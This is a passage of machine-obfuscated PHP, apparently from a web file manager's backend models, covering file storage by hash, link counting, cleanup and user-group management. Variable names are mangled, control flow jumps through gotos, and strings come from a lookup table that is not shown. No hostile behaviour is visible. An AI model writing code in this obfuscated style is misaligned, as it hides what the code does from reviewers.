$fÃÀï»ª = $this->add($BÊÅ»ÃÖ«Ë); $b¾îæ¯…¢‡ .= $fÃÀï»ª . $d­½†ëÀ‡Ü[47]; } } goto fŒëÙ˜ê„; cÄ’ÒÊóçÍ: } public function getUserJob($FÚâÒ‚¤„) { $A¸Øç‡ñ·² = Model($_SERVER[œº][506])->metaGet($FÚâÒ‚¤„); return $this->getUserJobInfo($A¸Øç‡ñ·²[self::JOB_KEY]); } public function getUserJobInfo($F”‚±ù¾ƒ¾) { goto B™ŞÒ¥¼¸; E’”â‘¬ñ¸: return $BÏÃ×È§ÙŠ; goto A½ÈœÍù ¨; B™ŞÒ¥¼¸: $EÏ•¢š¾Áƒ =& $_SERVER[œº]; $F ôàáéßÛ = explode($EÏ•¢š¾Áƒ[47], $F”‚±ù¾ƒ¾); $a˜ØËêÎí = parent::listData(); goto eŠøŒ†ô²±; eŠøŒ†ô²±: $a˜ØËêÎí = array_remove_key($a˜ØËêÎí, $EÏ•¢š¾Áƒ[194]); $BÏÃ×È§ÙŠ = array(); foreach ($F ôàáéßÛ as $d½”ùæ”Ä) { if (isset($a˜ØËêÎí[$d½”ùæ”Ä])) { $BÏÃ×È§ÙŠ[] = $a˜ØËêÎí[$d½”ùæ”Ä]; } } goto E’”â‘¬ñ¸; A½ÈœÍù ¨: } } goto a“šˆğ¡É; Eë±—÷õ’Î: class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\155\x65" => "\151\x6f\137\146\x69\x6c\x65\137\x6d\145\x74\141", "\x6d\x65\x74\141\106\x69\145\x6c\144" => "\146\x69\154\x65\111\x44"); public function fileInfo($bÓä¾ÓÃÎ¼) { $Bœ¦À™¨Ø¹ =& $_SERVER[œº]; static $a»ÃÔ´òå‚ = array(); if (!isset($a»ÃÔ´òå‚[$bÓä¾ÓÃÎ¼])) { $Bƒ‡á›¯ = $Bœ¦À™¨Ø¹[1736]; $eÁõÔöÉ”æ = Model($Bœ¦À™¨Ø¹[450])->field($Bƒ‡á›¯)->where(array($Bœ¦À™¨Ø¹[448] => $bÓä¾ÓÃÎ¼))->find(); $a»ÃÔ´òå‚[$bÓä¾ÓÃÎ¼] = $eÁõÔöÉ”æ; } return $a»ÃÔ´òå‚[$bÓä¾ÓÃÎ¼]; } public function addFileByContent($cˆÖ÷Ãùè® = '', $BÆ’ô½ë—â = '') { goto D·á’Øé¹Î; Dé‘Í¨»Ö: $d‚äàƒÏğ = $A¸»×»å° . $d¢İ°ŞçŸô[1738] . rand_string(16); file_put_contents($d‚äàƒÏğ, $cˆÖ÷Ãùè®); $Dé„ˆÙŸ†Ş = $this->addFile($d‚äàƒÏğ, $BÆ’ô½ë—â, !0); goto aÙ´ôš“´ˆ; aÙ´ôš“´ˆ: if (file_exists($d‚äàƒÏğ)) { @unlink($d‚äàƒÏğ); } return $Dé„ˆÙŸ†Ş; goto eÀ‡‚ø•âÜ; D·á’Øé¹Î: $d¢İ°ŞçŸô =& $_SERVER[œº]; $A¸»×»å° = TEMP_PATH . $d¢İ°ŞçŸô[1737]; if (!is_dir($A¸»×»å°)) { mk_dir($A¸»×»å°); } goto Dé‘Í¨»Ö; eÀ‡‚ø•âÜ: } public function createFileName($f·ŞŒÖ¨™, $bÆ¥¤Öµñ = false, $F³İğ³¿ìë = false) { goto Aëõø›íŠµ; F¡……¤£ŠÚ: $CŠñ¿à– = $fƒíäÏôŠ ->pathFather($E÷°®ºì‚); static $AÅ¡ªŒ³Œ· = false; $DğÅæŒ‡×¶ = $B°™’Ê‰[1739] . md5($CŠñ¿à–); goto Aµí´Úâİ¤; Aµí´Úâİ¤: if (!$AÅ¡ªŒ³Œ· && !Cache::get($DğÅæŒ‡×¶)) { $AÅ¡ªŒ³Œ· = !0; $a—å©ÎóÑ = IO::mkdir($CŠñ¿à–); if (!IO::exist($a—å©ÎóÑ . $B°™’Ê‰[761])) { IO::mkfile($a—å©ÎóÑ . $B°™’Ê‰[761]); } Cache::set($DğÅæŒ‡×¶, 1, 3600 * 2); } return $E÷°®ºì‚; goto DØ´ÄÃ§¹Â; Aëõø›íŠµ: $B°™’Ê‰ =& $_SERVER[œº]; $fƒíäÏôŠ  = IO::init($B°™’Ê‰[8]); $E÷°®ºì‚ = $this->makeFilePath($f·ŞŒÖ¨™, $fƒíäÏôŠ , $bÆ¥¤Öµñ, $F³İğ³¿ìë); goto F¡……¤£ŠÚ; DØ´ÄÃ§¹Â: } public function makeFilePath($CºŸÓ²¥, $cä¢À¨¯Ã´, $CœÄ¥”Ô¤ô = false, $D†¾İ™ƒ = false) { goto c’íëÒ†·; c’íëÒ†·: $bâÉâáæ¡ =& $_SERVER[œº]; $bàÀó±Àãà = Model($bâÉâáæ¡[730])->get($bâÉâáæ¡[1740]); $d…ŒÉæø¤ = KodIO::defaultIO() . date($bâÉâáæ¡[1741]); goto D…ª‹İíé¥; D…ª‹İíé¥: $E‡¼É¹í± = $d…ŒÉæø¤ . rand_string(5) . short_id(100); $CºŸÓ²¥ = str_replace($bâÉâáæ¡[8], $bâÉâáæ¡[71], KodIO::clear($CºŸÓ²¥)); $B§ÀÔ»ãˆ— = $cä¢À¨¯Ã´->ext($CºŸÓ²¥); goto cƒ‘è‡¢ó; cƒ‘è‡¢ó: if (!$CºŸÓ²¥) { $bàÀó±Àãà = $bâÉâáæ¡[1742]; } switch ($bàÀó±Àãà) { case $bâÉâáæ¡[1743]: $E‡¼É¹í± = $E‡¼É¹í± . $bâÉâáæ¡[95] . $cä¢À¨¯Ã´->ext($CºŸÓ²¥); if ($B§ÀÔ»ãˆ— == $bâÉâáæ¡[1682]) { $E‡¼É¹í± .= $bâÉâáæ¡[1428]; } break; case $bâÉâáæ¡[1744]: goto Bµ™ÓÕ Â; aï—¦ÁÓõñ: CacheLock::lock($C„ùÀ¯ºœÓ); $E‡¼É¹í± = $d…ŒÉæø¤ . $CºŸÓ²¥; if (IO::exist($d…ŒÉæø¤ . $CºŸÓ²¥)) { $F¬ƒë©‹ì“ = substr($CºŸÓ²¥, 0, strlen($CºŸÓ²¥) - strlen($B§ÀÔ»ãˆ—)); $b’“½¥Šº = $D†¾İ™ƒ ? substr($D†¾İ™ƒ, 0, 5) : ($CœÄ¥”Ô¤ô ? substr($CœÄ¥”Ô¤ô, 0, 5) : rand_string(5)); $E‡¼É¹í± = $d…ŒÉæø¤ . $F¬ƒë©‹ì“ . $b’“½¥Šº . $bâÉâáæ¡[95] . $B§ÀÔ»ãˆ—; } goto c§²¯ò’’; Bµ™ÓÕ Â: $eÇïÒó¯£ = Model($bâÉâáæ¡[730])->get($bâÉâáæ¡[731]); $bß¢†µŸ†ƒ = substr(md5($bâÉâáæ¡[732] . $eÇïÒó¯£ . date($bâÉâáæ¡[708])), 0, 8); $e àĞî‹ß« = KodIO::defaultDriver(); goto Aºé·“½; Aºé·“½: $d…ŒÉæø¤ = $bâÉâáæ¡[1124] . $e àĞî‹ß«[$bâÉâáæ¡[393]] . $bâÉâáæ¡[402] . date($bâÉâáæ¡[1745]) . $bß¢†µŸ†ƒ . $bâÉâáæ¡[8]; if ($B§ÀÔ»ãˆ— == $bâÉâáæ¡[1682]) { $CºŸÓ²¥ .= $bâÉâáæ¡[1428]; } $C„ùÀ¯ºœÓ = $bâÉâáæ¡[1746] . $d…ŒÉæø¤ . $CºŸÓ²¥; goto aï—¦ÁÓõñ; c§²¯ò’’: if (IO::isTypeObject($E‡¼É¹í±) && !IO::isUploadServer($E‡¼É¹í±)) { if (IO::exist($E‡¼É¹í±)) { return $E‡¼É¹í±; } $Fµ‚Œè¹É = IO::setContent($E‡¼É¹í±, $bâÉâáæ¡[33]); if (!$Fµ‚Œè¹É) { show_json($bâÉâáæ¡[1747], !1); } } CacheLock::unlock($C„ùÀ¯ºœÓ); break; goto Añµ´«÷­ä; Añµ´«÷­ä: case $bâÉâáæ¡[1742]: break; default: break; } return $E‡¼É¹í±; goto FÎÍ†¸Ù˜¤; FÎÍ†¸Ù˜¤: } public function addFileByRemote($Aéö¡ï¬ƒõ, $e„Š›Öî§, $EÚ’‡éÑšè = array()) { goto F»Õƒ‰É¸; fÄ†öÓŠ²: $bë‹ÉÈ‘ = IO::hashMd5($Aéö¡ï¬ƒõ, $Eö¹†¾¬Ğ‚); $EÊ¨Ğ±­±ç = KodIO::defaultDriver(); $eğŒÀÉ×Š = array($e‡Ï¬•ëğ[548] => IO::size($Aéö¡ï¬ƒõ), $e‡Ï¬•ëğ[1748] => 1, $e‡Ï¬•ëğ[413] => $e„Š›Öî§, $e‡Ï¬•ëğ[773] => $EÊ¨Ğ±­±ç[$e‡Ï¬•ëğ[393]], $e‡Ï¬•ëğ[414] => $Aéö¡ï¬ƒõ, $e‡Ï¬•ëğ[1749] => $EÚ’‡éÑšè[$e‡Ï¬•ëğ[171]] ? $EÚ’‡éÑšè[$e‡Ï¬•ëğ[171]] : IO::hashSimple($Aéö¡ï¬ƒõ), $e‡Ï¬•ëğ[1750] => $bë‹ÉÈ‘ ? $bë‹ÉÈ‘ : $Eö¹†¾¬Ğ‚); goto D¹‚Ô³ãŒ”; F»Õƒ‰É¸: $e‡Ï¬•ëğ =& $_SERVER[œº]; if (!IO::exist($Aéö¡ï¬ƒõ)) { return !1; } $Eö¹†¾¬Ğ‚ = $EÚ’‡éÑšè[$e‡Ï¬•ëğ[170]] ? $EÚ’‡éÑšè[$e‡Ï¬•ëğ[170]] : $e‡Ï¬•ëğ[33]; goto fÄ†öÓŠ²; D¹‚Ô³ãŒ”: if ($dÄì¢”Û»¨ = $this->addFileCheckExist($eğŒÀÉ×Š[$e‡Ï¬•ëğ[171]], $eğŒÀÉ×Š[$e‡Ï¬•ëğ[170]], $eğŒÀÉ×Š[$e‡Ï¬•ëğ[78]])) { return $dÄì¢”Û»¨; } return $this->addFileData($eğŒÀÉ×Š); goto bä©£¬İŠ¶; bä©£¬İŠ¶: } private function addFileData($a½ù”¼¿Ã¦) { $F™÷‰á‡¾Ã =& $_SERVER[œº]; if (!$a½ù”¼¿Ã¦) { return !1; } $a½ù”¼¿Ã¦[$F™÷‰á‡¾Ã[78]] = intval($a½ù”¼¿Ã¦[$F™÷‰á‡¾Ã[78]]); if (!$a½ù”¼¿Ã¦[$F™÷‰á‡¾Ã[78]] && strlen($a½ù”¼¿Ã¦[$F™÷‰á‡¾Ã[171]]) > 32) { $a½ù”¼¿Ã¦[$F™÷‰á‡¾Ã[78]] = intval(substr($a½ù”¼¿Ã¦[$F™÷‰á‡¾Ã[171]], 32)); } $b¡ÕˆÊŒÑæ = $this->add($a½ù”¼¿Ã¦); return $this->find($b¡ÕˆÊŒÑæ); } public function addFile($DÉ§íôìĞÔ, $a÷­Š¼ÌŸ , $DŞ¹ñëíƒ” = false) { goto D’Ê¤‘ÏÔ; D’Ê¤‘ÏÔ: $f¹©²Éù•¥ = IO::hashSimple($DÉ§íôìĞÔ); $FˆÆ‚ğòğ¹ = IO::hashMd5($DÉ§íôìĞÔ); $EêÙáÎµÌ = IO::size($DÉ§íôìĞÔ); goto c±… ‘ÈÀ»; Cï»ºç›À: $B×»¬‰°é» = $this->addFileMake($DÉ§íôìĞÔ, $EêÙáÎµÌ, $f¹©²Éù•¥, $FˆÆ‚ğòğ¹, $a÷­Š¼ÌŸ , $DŞ¹ñëíƒ”); $BŒŠ¹µÊ¦µ = $this->addFileData($B×»¬‰°é»); CacheLock::unlock($eŒ«òĞ…É§); goto DÍºŒÆªÔˆ; DÍºŒÆªÔˆ: return $BŒŠ¹µÊ¦µ; goto a˜²ğê‹ŠÔ; c±… ‘ÈÀ»: $eŒ«òĞ…É§ = $_SERVER[œº][1751] . $FˆÆ‚ğòğ¹; CacheLock::lock($eŒ«òĞ…É§); if ($a´öõö“¢İ = $this->addFileCheckExist($f¹©²Éù•¥, $FˆÆ‚ğòğ¹, $EêÙáÎµÌ)) { CacheLock::unlock($eŒ«òĞ…É§); return $a´öõö“¢İ; } goto Cï»ºç›À; a˜²ğê‹ŠÔ: } public function addFileMake($Aà÷¸»Äª†, $bÖÙ’Ô©ß, $cùñÍ·³ÈÌ, $D–Ù¦†°§ö, $C¡å­…Éß , $dÁÉÉÛŠÅ) { goto cÖ¡ë—¤Ö¶; aÒ•“ğ¬‚•: $dµĞ¤Ñâ×æ = KodIO::defaultDriver(); $D’Õº³ã = array($f‡Øˆ³º¸ó[548] => $bÖÙ’Ô©ß, $f‡Øˆ³º¸ó[1748] => 1, $f‡Øˆ³º¸ó[413] => $C¡å­…Éß , $f‡Øˆ³º¸ó[773] => $dµĞ¤Ñâ×æ[$f‡Øˆ³º¸ó[393]], $f‡Øˆ³º¸ó[414] => $f¢ãÒÑŒ¼, $f‡Øˆ³º¸ó[1749] => $cùñÍ·³ÈÌ, $f‡Øˆ³º¸ó[1750] => $D–Ù¦†°§ö); return $D’Õº³ã; goto bèˆ Ì………; cÖ¡ë—¤Ö¶: $f‡Øˆ³º¸ó =& $_SERVER[œº]; $f¢ãÒÑŒ¼ = $this->createFileName($C¡å­…Éß , $cùñÍ·³ÈÌ, $D–Ù¦†°§ö); $E¯Î‹’éÁˆ = get_path_father($f¢ãÒÑŒ¼); goto A›ŠŞÕ•¤È; A›ŠŞÕ•¤È: $DÉèƒİ‡—ç = get_path_this($f¢ãÒÑŒ¼); if ($dÁÉÉÛŠÅ) { $Bœ³ï¹Úñ… = IO::move($Aà÷¸»Äª†, $E¯Î‹’éÁˆ, !1, $DÉèƒİ‡—ç); } else { $Bœ³ï¹Úñ… = IO::copy($Aà÷¸»Äª†, $E¯Î‹’éÁˆ, !1, $DÉèƒİ‡—ç); } if (!$Bœ³ï¹Úñ…) { return !1; } goto aÒ•“ğ¬‚•; bèˆ Ì………: } public function addFileCheckExist($DàØùÄŒí¨, $bÌ—–çëÜÁ, $AÌ“’¦øÛÑ) { $c’Ï‰º¼ =& $_SERVER[œº]; $aÄ»ï»Óò = $this->findByHash($DàØùÄŒí¨, $bÌ—–çëÜÁ); if (!$aÄ»ï»Óò) { return !1; } $DŠã¾Òìº = array($c’Ï‰º¼[1748] => intval($aÄ»ï»Óò[$c’Ï‰º¼[1752]]) + 1, $c’Ï‰º¼[548] => $AÌ“’¦øÛÑ); $this->where(array($c’Ï‰º¼[448] => $aÄ»ï»Óò[$c’Ï‰º¼[447]]))->save($DŠã¾Òìº); return $aÄ»ï»Óò; } public function remove($FîÄÑÊí‡à) { $this->linkCountChange($FîÄÑÊí‡à, !1); $this->clearEmpty(); return !0; } public function linkAdd($d–óÁªãÀ°) { $this->linkCountChange($d–óÁªãÀ°, !0); } public function linkCountChange($fÆ±§´ß–ù, $b¸„Æ±„Öº) { goto b×©öÖÇğ—; b×©öÖÇğ—: $DÄÇÒÀÉğ =& $_SERVER[œº]; if (!$fÆ±§´ß–ù) { return; } if (!is_array($fÆ±§´ß–ù)) { $fÆ±§´ß–ù = array($fÆ±§´ß–ù); } goto Bµ·¼ØƒÊ; fÉßà¤ó: foreach ($F¦ºöñùµ® as $aÊß”¤Ÿ¿Ê => $f¸ôÁ¸‚™) { $A‘Ë„²ª„ = $f¸ôÁ¸‚™ . $DÄÇÒÀÉğ[33]; if (!$AğÍ„Ä¢Çö[$A‘Ë„²ª„]) { $AğÍ„Ä¢Çö[$A‘Ë„²ª„] = array(); } $AğÍ„Ä¢Çö[$A‘Ë„²ª„][] = $aÊß”¤Ÿ¿Ê; } foreach ($AğÍ„Ä¢Çö as $f¸ôÁ¸‚™ => $Cêø‘†î„Ñ) { if (!$Cêø‘†î„Ñ) { continue; } $f¸ôÁ¸‚™ = $b¸„Æ±„Öº ? $f¸ôÁ¸‚™ : -intval($f¸ôÁ¸‚™); $a°Å–îİ´¨ = array($DÄÇÒÀÉğ[447] => array($DÄÇÒÀÉğ[7], $Cêø‘†î„Ñ)); if ($f¸ôÁ¸‚™ < 0) { $a°Å–îİ´¨[$DÄÇÒÀÉğ[1752]] = array($DÄÇÒÀÉğ[972], abs($f¸ôÁ¸‚™)); } $this->where($a°Å–îİ´¨)->setAdd($DÄÇÒÀÉğ[1752], $f¸ôÁ¸‚™); } goto CØ„°–ø„Í; Bµ·¼ØƒÊ: $F¦ºöñùµ® = array(); foreach ($fÆ±§´ß–ù as $aÊß”¤Ÿ¿Ê) { $A‘Ë„²ª„ = $aÊß”¤Ÿ¿Ê . $DÄÇÒÀÉğ[33]; if (!$F¦ºöñùµ®[$A‘Ë„²ª„]) { $F¦ºöñùµ®[$A‘Ë„²ª„] = 0; } $F¦ºöñùµ®[$A‘Ë„²ª„]++; } $AğÍ„Ä¢Çö = array(); goto fÉßà¤ó; CØ„°–ø„Í: } public function findByHash($dæ¯¾ƒ¾·, $C­³ÖÃäÎ• = false) { $Eƒ—Âòâß =& $_SERVER[œº]; if (!$dæ¯¾ƒ¾· && !$C­³ÖÃäÎ•) { return !1; } $F­âµèˆ£– = array($Eƒ—Âòâß[1749] => $dæ¯¾ƒ¾·); if ($C­³ÖÃäÎ•) { $F­âµèˆ£– = array($Eƒ—Âòâß[1750] => $C­³ÖÃäÎ•); } return $this->order($Eƒ—Âòâß[1753])->where($F­âµèˆ£–)->find(); } public function clearEmpty($b­š”İ££â = 0) { goto cÎ’¶´İ‰Í; EÒˆíåØ×í: foreach ($aöí¤µèÎÂ as $Fˆƒ„²„ª») { $EÉİŠÍ‹¥¥->update(1); $this->resetFile($Fˆƒ„²„ª»); } $EÉİŠÍ‹¥¥->end(); goto F«…¢‹í£; b­ÈíôÖÅ: $aöí¤µèÎÂ = $this->where($b¬›§‚ÇÄ)->select(); if (!$aöí¤µèÎÂ) { return; } $EÉİŠÍ‹¥¥ = new Task($E”éÈ¸ˆí[1755], $E”éÈ¸ˆí[33], count($aöí¤µèÎÂ)); goto EÒˆíåØ×í; cÎ’¶´İ‰Í: $E”éÈ¸ˆí =& $_SERVER[œº]; $f¢÷ª²›×¢ = time() - 3600 * 24 * $b­š”İ££â; $b¬›§‚ÇÄ = $E”éÈ¸ˆí[1754] . $f¢÷ª²›×¢; goto b­ÈíôÖÅ; F«…¢‹í£: } public function resetFile($C ¯ÒˆÅÀ) { goto A„Ì´£ëÉù; A–—È“ÄÛ‰: $DÀ²‘À‹‡¾ = Model($BÚÁ¯—òÁ³[1756])->where($c³Õ‘îÛ¡·)->count(); $eŠ‡º”Šßï = intval($e„ßÒ¢àâÎ) + intval($DÀ²‘À‹‡¾); if ($eŠ‡º”Šßï == 0) { IO::remove($C ¯ÒˆÅÀ[$BÚÁ¯—òÁ³[76]]); Model($BÚÁ¯—òÁ³[1757])->delete($C ¯ÒˆÅÀ[$BÚÁ¯—òÁ³[447]]); $this->where($c³Õ‘îÛ¡·)->delete(); $this->metaSet($C ¯ÒˆÅÀ[$BÚÁ¯—òÁ³[447]], null, null); return; } goto EË•Ÿïïù; A„Ì´£ëÉù: $BÚÁ¯—òÁ³ =& $_SERVER[œº]; $c³Õ‘îÛ¡· = array($BÚÁ¯—òÁ³[448] => $C ¯ÒˆÅÀ[$BÚÁ¯—òÁ³[447]]); $e„ßÒ¢àâÎ = Model($BÚÁ¯—òÁ³[1206])->where($c³Õ‘îÛ¡·)->count(); goto A–—È“ÄÛ‰; EË•Ÿïïù: if ($C ¯ÒˆÅÀ[$BÚÁ¯—òÁ³[1752]] != $eŠ‡º”Šßï) { $this->where($c³Õ‘îÛ¡·)->save(array($BÚÁ¯—òÁ³[1748] => $eŠ‡º”Šßï)); } goto fçÆŠ‚Â§; fçÆŠ‚Â§: } public function storageInfo($C·–³ƒëÉ‚ = false) { goto eËœÛâ¢™; c£’ÌØáÏÖ: for ($F‘¥½¼Ú†À = 0; $F‘¥½¼Ú†À < $EâİªÏß•‚; $F‘¥½¼Ú†À = $F‘¥½¼Ú†À + $eµó¡¯í©Ä) { $c™ã¯½ŠŠ = $this->limit($F‘¥½¼Ú†À, $F‘¥½¼Ú†À + $eµó¡¯í©Ä)->select(); foreach ($c™ã¯½ŠŠ as $b¢ÅÜÀÑİÆ) { $b‘ë‰¡æÜ += $b¢ÅÜÀÑİÆ[$e‘‚ßŸâÄÍ[78]] * $b¢ÅÜÀÑİÆ[$e‘‚ßŸâÄÍ[1752]]; $f•·ëËô¦¡ += $b¢ÅÜÀÑİÆ[$e‘‚ßŸâÄÍ[78]] * ($b¢ÅÜÀÑİÆ[$e‘‚ßŸâÄÍ[1752]] - 1); $dõäè°”ÜÑ += $b¢ÅÜÀÑİÆ[$e‘‚ßŸâÄÍ[1752]]; } } $D‘ÇÔÎÖÜ = array($e‘‚ßŸâÄÍ[1758] => $b‘ë‰¡æÜ, $e‘‚ßŸâÄÍ[1759] => $f•·ëËô¦¡, $e‘‚ßŸâÄÍ[1760] => $f•·ëËô¦¡ / $b‘ë‰¡æÜ, $e‘‚ßŸâÄÍ[82] => $EâİªÏß•‚, $e‘‚ßŸâÄÍ[1761] => $dõäè°”ÜÑ); return $D‘ÇÔÎÖÜ; goto B®Î½„±éô; AŸÅ¯ÍŞí³: $b‘ë‰¡æÜ = 1; $dõäè°”ÜÑ = 0; $eµó¡¯í©Ä = 5000; goto c£’ÌØáÏÖ; eËœÛâ¢™: $e‘‚ßŸâÄÍ =& $_SERVER[œº]; $EâİªÏß•‚ = $this->count() + 0.0; $f•·ëËô¦¡ = 0; goto AŸÅ¯ÍŞí³; B®Î½„±éô: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\x61\x6d\145" => "\x67\x72\157\x75\160\x5f\x6d\145\164\x61", "\x6d\x65\164\141\x46\151\145\x6c\144" => "\x67\162\157\165\160\x49\x44"); protected function cacheFunctionAlias($Aß—Ù—«ƒ°) { $FĞè¤æí»ƒ =& $_SERVER[œº]; return array($FĞè¤æí»ƒ[1762] => array($Aß—Ù—«ƒ°[0], $FĞè¤æí»ƒ[1763]), $FĞè¤æí»ƒ[1764] => array($Aß—Ù—«ƒ°[0], $FĞè¤æí»ƒ[1763])); } protected function getInfo($f×¶ˆ¦ÛĞŞ) { $cÍß»ô©ÊÄ = $this->getInfoSimple($f×¶ˆ¦ÛĞŞ); if (!$cÍß»ô©ÊÄ) { return !1; } return $this->_listDataApplyItem($cÍß»ô©ÊÄ); } protected function getInfoSimple($D¤±…¨Ê¯ª, $d•í³Ù”¦” = false) { $AÉ×¨—ùùË =& $_SERVER[œº]; if ($d•í³Ù”¦”) { $bÂ¹†ŞÃ  = array($AÉ×¨—ùùË[1692] => intval($D¤±…¨Ê¯ª)); $E¨—±°×Ò° = $this->where($bÂ¹†ŞÃ )->find(); return is_array($E¨—±°×Ò°) ? $E¨—±°×Ò° : array(); } return $this->cacheFunctionGet($AÉ×¨—ùùË[1765], $D¤±…¨Ê¯ª); } protected function groupAdd($d÷ß—ŠŞ­•) { goto e“Ì”ôÆ‚; e“Ì”ôÆ‚: $DäÃÁˆ¾è› =& $_SERVER[œº]; if (!$d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[478]] && isset($d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1692]]) && $d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1692]] == 1) { if ($fÎóâ‘ğŞ = $this->getInfoSimple($d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1692]], !0)) { return $d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1692]]; } } else { $fÎóâ‘ğŞ = $this->getInfoSimple($d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[478]]); if (!$fÎóâ‘ğŞ) { return !1; } } $eîÆ‚˜Ò¹ì = $DäÃÁˆ¾è›[498]; goto D Ë¸æ¯ˆï; fó‡Ù°ƒ‘: if (!empty($d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1692]])) { $dÌêãõÜïÇ[$DäÃÁˆ¾è›[1692]] = $d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1692]]; } $CÀåáŒİïÂ = $this->add($dÌêãõÜïÇ); $this->setNamePinyin($CÀåáŒİïÂ, $dÌêãõÜïÇ[$DäÃÁˆ¾è›[28]]); goto A¨Î‰»ŸŒ; A¨Î‰»ŸŒ: if (isset($d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1768]])) { $this->metaSet($CÀåáŒİïÂ, array($DäÃÁˆ¾è›[1768] => $d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1768]], $DäÃÁˆ¾è›[1769] => $d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1769]])); unset($d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1768]]); unset($d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1769]]); } Model($DäÃÁˆ¾è›[1206])->groupRootAdd($CÀåáŒİïÂ); return $CÀåáŒİïÂ; goto b¨Ïˆ‘’šÉ; D Ë¸æ¯ˆï: if ($fÎóâ‘ğŞ[$DäÃÁˆ¾è›[487]]) { $eîÆ‚˜Ò¹ì = $fÎóâ‘ğŞ[$DäÃÁˆ¾è›[487]] . $fÎóâ‘ğŞ[$DäÃÁˆ¾è›[1692]] . $DäÃÁˆ¾è›[47]; } $dÌêãõÜïÇ = array($DäÃÁˆ¾è›[413] => $this->groupNameAuto($d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[478]], $d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[28]]), $DäÃÁˆ¾è›[394] => $d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[478]], $DäÃÁˆ¾è›[553] => $eîÆ‚˜Ò¹ì, $DäÃÁˆ¾è›[1766] => $d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1676]], $DäÃÁˆ¾è›[1767] => 0, $DäÃÁˆ¾è›[1696] => 0); if (isset($d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1715]])) { $dÌêãõÜïÇ[$DäÃÁˆ¾è›[1715]] = $d÷ß—ŠŞ­•[$DäÃÁˆ¾è›[1715]]; } else { $DµÁÃ§Ñ¨ = $this->max($DäÃÁˆ¾è›[1715]); if (!$DµÁÃ§Ñ¨) { $DµÁÃ§Ñ¨ = 0; } $dÌêãõÜïÇ[$DäÃÁˆ¾è›[1715]] = $DµÁÃ§Ñ¨ + 1; } goto fó‡Ù°ƒ‘; b¨Ïˆ‘’šÉ: } protected function groupEdit($eğöïÃ½ˆÜ, $Eˆå¹«ùÛ±) { goto dèó®ÅèÄ; dèó®ÅèÄ: $FÉ… í‘äÖ =& $_SERVER[œº]; $bÒ•”ˆ¡÷è = $this->getInfoSimple($eğöïÃ½ˆÜ); if (!$bÒ•”ˆ¡÷è) { return !1; } goto C‘À‘ßäÅç; DßÌÍ®—ç¸: if (isset($Eˆå¹«ùÛ±[$FÉ… í‘äÖ[28]]) && $Eˆå¹«ùÛ±[$FÉ… í‘äÖ[28]] != $bÒ•”ˆ¡÷è[$FÉ… í‘äÖ[28]]) { $this->_clearChildrenCache($bÒ•”ˆ¡÷è); } return $this->where(array($FÉ… í‘äÖ[1770] => $eğöïÃ½ˆÜ))->save($Eˆå¹«ùÛ±); goto f¿ˆåò¿Ò; C‘À‘ßäÅç: if (!empty($Eˆå¹«ùÛ±[$FÉ… í‘äÖ[478]])) { $DºÙÆèÉÉ” = $this->getInfoSimple($Eˆå¹«ùÛ±[$FÉ… í‘äÖ[478]]); if (!$DºÙÆèÉÉ”) { return !1; } if ($bÒ•”ˆ¡÷è[$FÉ… í‘äÖ[1692]] == $DºÙÆèÉÉ”[$FÉ… í‘äÖ[1692]]) { return !1; } if ($Eˆå¹«ùÛ±[$FÉ… í‘äÖ[478]] != $bÒ•”ˆ¡÷è[$FÉ… í‘äÖ[478]]) { if ($DºÙÆèÉÉ”[$FÉ… í‘äÖ[487]] !== $bÒ•”ˆ¡÷è[$FÉ… í‘äÖ[487]] && strpos($DºÙÆèÉÉ”[$FÉ… í‘äÖ[487]], $bÒ•”ˆ¡÷è[$FÉ… í‘äÖ[487]] . $bÒ•”ˆ¡÷è[$FÉ… í‘äÖ[1692]] . $FÉ… í‘äÖ[47]) === 0) { return !1; } $Eˆå¹«ùÛ±[$FÉ… í‘äÖ[553]] = $DºÙÆèÉÉ”[$FÉ… í‘äÖ[487]] . $Eˆå¹«ùÛ±[$FÉ… í‘äÖ[478]] . $FÉ… í‘äÖ[47]; $this->_changeChildLevel($bÒ•”ˆ¡÷è, $DºÙÆèÉÉ”); } } if (isset($Eˆå¹«ùÛ±[$FÉ… í‘äÖ[28]])) { $this->setNamePinyin($eğöïÃ½ˆÜ, $Eˆå¹«ùÛ±[$FÉ… í‘äÖ[28]]); } if (isset($Eˆå¹«ùÛ±[$FÉ… í‘äÖ[1768]])) { $this->metaSet($eğöïÃ½ˆÜ, array($FÉ… í‘äÖ[1768] => $Eˆå¹«ùÛ±[$FÉ… í‘äÖ[1768]], $FÉ… í‘äÖ[1769] => $Eˆå¹«ùÛ±[$FÉ… í‘äÖ[1769]])); unset($Eˆå¹«ùÛ±[$FÉ… í‘äÖ[1768]]); unset($Eˆå¹«ùÛ±[$FÉ… í‘äÖ[1769]]); } goto DßÌÍ®—ç¸; f¿ˆåò¿Ò: } private function _clearChildrenCache($EàãÖù…Ê) { $aÓ³‘”¹×· =& $_SERVER[œº]; $dĞï—§·œ = array($aÓ³‘”¹×·[553] => array($aÓ³‘”¹×·[512], $EàãÖù…Ê[$aÓ³‘”¹×·[487]] . $EàãÖù…Ê[$aÓ³‘”¹×·[1692]] . $aÓ³‘”¹×·[513])); $FòÆŸ…Ş˜± = $this->field($aÓ³‘”¹×·[1692])->where($dĞï—§·œ)->select(); foreach ($FòÆŸ…Ş˜± as $Eé±Äøé‘Ó) { $this->cacheFunctionClear($aÓ³‘”¹×·[1771], 